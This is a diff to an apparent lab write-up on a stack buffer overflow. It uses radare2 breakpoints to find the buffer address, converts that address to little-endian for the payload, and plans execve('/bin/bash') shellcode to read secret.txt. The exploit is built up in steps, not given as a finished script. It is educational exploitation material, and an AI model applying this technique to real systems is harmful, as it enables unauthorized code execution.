@@ -1235,11 +1235,30 @@ Print the Disassmbly of the Function with `pdf`
 
 **Run The Pattern:** `:> ood $(cat pattern.txt)` to cause the crash
 
-When executing the `ood` command, the program starts in debug mode. This means the entry point, not main(). Let's verify with `pd 5` to Print the Disassembly of 5 instructions from `rip`:  
+Set two breakpoints  
+`db 0x00400528` <- will provide the original, uncorrupted buffer address assigned to 'rbp - 0x90' (var_90h)
+`db 0x00400563` <- Stops just at 'ret' allowing us to see the stored values
 
-We can, now, execute the program to the breakpoint with `dc`.  
+![breakpoints](assets/buffer-overflow-18-task8-7.png)
 
-![the breakpoint](assets/buffer-overflow-22-task8-12.png)
+"continue" the program: `dc`
+inspect rbp to identify the uncorrupted memory address rbp: `dr rbp`
+
+![buffer](assets/buffer-overflow-19-task8-8.png)
+
+As seen early, the buffer is assigned to variables var_90h which is initiated at rbp-0x90.
+
+A [Hex Calculator](https://www.calculator.net/hex-calculator.html) will help with this.
+
+Buffer address = 0x7fffffffe2a0 - 0x90 = 0x7fffffffe210
+
+![hex math](assets/buffer-overflow-20-task8-9.png)
+
+The buffer starts at: 0x7fffffffe210
+
+For use in the eventual exploit, this must be in little-endian: \x10\xe2\xff\xff\xff\x7f\x00\x00
+
+continue to the next breakpoint: `dc`
 
 Inspect the registers with `dr`:  
 
@@ -1275,8 +1294,9 @@ We know `ret` will cause the program to jump to `rsp`. The value of `rsp` is the
 
 `rsp` contains `AzAA1AA2AA3AA4AA`  
 
-There are now two pieces of valuable information:  
+There are now three pieces of valuable information:  
 
+- Part of the exploit payload: \x10\xe2\xff\xff\xff\x7f\x00\x00
 - Saved rbp contains: "wAxAwAy"
 - Return address contains: "AzAA1AA2"
 
@@ -1302,3 +1322,10 @@ What we know now:
 
 The exploit works, as previously stated, by placing the shellcode into the buffer and inserting the memory address of the buffer start point into `ret`. Between `buffer` and `ret` we use NOPS.
 
+Building the shellcode starts with a minimum requirement: ```bash execve("/bin/bash", argv, envp)```
+
+Of course, the first argument needs to be a shell already on the system being compromised.  
+
+The simplest is to set the second and third arguements to NULL: ```bash execve("/bin/bash", NULL, NULL)```
+
+The objective of this task is to read the secret.txt file. That could be automated with ```bash execve("/bin/bash", ["/bin/bash", "-c", "cat secret.txt"], NULL)```
